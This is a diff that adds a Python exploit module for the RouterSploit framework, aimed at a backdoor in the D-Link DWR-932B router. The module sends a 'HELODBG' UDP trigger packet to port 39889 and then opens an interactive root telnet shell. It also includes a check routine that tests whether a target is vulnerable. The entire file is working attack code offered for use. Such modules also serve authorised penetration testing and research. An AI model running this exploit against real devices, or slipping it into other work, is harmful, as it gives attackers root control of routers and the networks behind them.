@@ -1,0 +1,79 @@
+import socket
+import telnetlib
+
+from routersploit import (
+    exploits,
+    print_error,
+    print_success,
+    print_status,
+    mute,
+    validators,
+)
+
+
+class Exploit(exploits.Exploit):
+    """
+    Exploit implementation for D-Link DWR-932B backdoor vulnerability.
+    If the target is vulnerable, telnet access is provided with root privileges.
+    """
+    __info__ = {
+        'name': 'D-LINK DWR-932B',
+        'description': 'Module exploits D-Link DWR-932B backdoor vulnerability which allows executing command on operating system level with root privileges.',
+        'authors': [
+            'Pierre Kim @PierreKimSec',  # vulnerability discovery
+            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
+        ],
+        'references': [
+            'https://pierrekim.github.io/advisories/2016-dlink-0x00.txt',
+        ],
+        'devices': [
+            'D-Link DWR-932B',
+        ]
+    }
+
+    target = exploits.Option('', 'Target address e.g. 192.168.1.1', validators=validators.ipv4)
+    telnet_port = exploits.Option(23, 'Target telnet port', validators=validators.integer)
+
+    def run(self):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.settimeout(10.0)
+
+        print_status("Sending backdoor packet...")
+
+        response = ""
+        try:
+            sock.sendto("HELODBG", (self.target, 39889))
+            response = sock.recv(1024)
+        except:
+            pass
+
+        sock.close()
+
+        if "Hello" in response:
+            print_success("Target seems to vulnerable")
+            print_status("Trying to connect to the telnet service {}:{}".format(self.target, self.telnet_port))
+
+            try:
+                tn = telnetlib.Telnet(self.target, self.telnet_port)
+                tn.interact()
+            except:
+                print_error("Exploit failed - could not connect to the telnet service")
+        else:
+            print_error("Exploit failed - target seems to be not vulnerable")
+
+    @mute
+    def check(self):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.settimeout(10.0)
+
+        try:
+            sock.sendto("HELODBG", (self.target, 39889))
+            response = sock.recv(1024)
+
+            if "Hello" in response:
+                sock.sendto("BYEDBG", (self.target, 39889))
+                return True  # target is vulnerable
+        except:
+            pass
+
+        return False  # target is not vulnerable
